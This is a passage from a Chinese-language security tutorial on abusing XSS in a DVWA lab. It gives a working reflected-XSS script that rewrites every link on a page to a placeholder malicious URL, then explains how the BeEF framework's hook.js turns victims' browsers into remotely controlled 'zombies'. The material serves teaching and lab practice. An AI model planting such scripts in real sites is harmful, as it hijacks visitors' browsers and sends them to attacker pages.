**一、修改页面链接的原理**我们前面课程已经简单了解过使用 XSS 跳转页面的方式，但是跳转页面能够怎么运行利用呢？一般分为两种。

1. 跳转到恶意网站劫持用户浏览器

2. 跳转到广告页面获取利益，或者跳转到固定页面对网站运行刷流量。第二种比较简单，就无需要过多讲解，下面我们讲解一下劫持用户浏览器的方式。

实验结构：用户访问黑客构建的 XSS 攻击链接，跳转到恶意网址并加载 hook.js 代码，黑客通过hook.js 劫持用户浏览器。  

**构建反射型****XSS****攻击**

我们先构建一个反射型的 XSS 攻击跳转到存在漏洞的页面。其实也可以在 DVWA 中直接迚行攻击，但是我们处于演示目的构造了一个相对复杂的环境。JavaScript 代码分析 window.onload 当网页加载完成时，执行 function 匿名凼数

*   
*   
*   
*   
*   
*   
*   

```
<script>window.onload = function() {var link=document.getElementsByTagName("a");for(j = 0; j < link.length; j++) {link[j].href="http://xxxx.cn";}}</script>
```

凼数功能：

document.getElementsByTagName 获取页面中所有的 a 标签，存放到 link 数组中，使用 for 循环将 link 数组中的所有元素替换为恶意网址。打开chrome 浏览器，我们在反射型 XSS 中运行测试效果登录 http://192.168.1.12/DVWA-master/login.php

**使用 beef 劫持用户浏览器**

BeEF（ The Browser Exploitation Framework） 是由 Wade Alcorn(瓦德·奥尔康) 在 2006 年开始创建的，至今还在维护。是由 ruby 语言开发的后门针对浏览器攻击的框架。

![](../Images/9c17744c09af2203dae889dc23199656.png)

zombie（僵尸）即受害的浏览器。zombie 是被 hook（勾连）的，如果浏览器访问了有勾子（由 js编写）的页面，就会被 hook，勾连的浏览器会执行初始代码返回一些信息，接着 zombie 会每隔一段时间（默认为 1 秒）就会向 BeEF 服务器发送一个请求，询问是否有新的代码需要执行。BeEF 服务器本质上就像一个 Web 应用，被分为前端 UI， 和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF 持有者可以通过浏览器来登录 BeEF 的后台管理 UI。
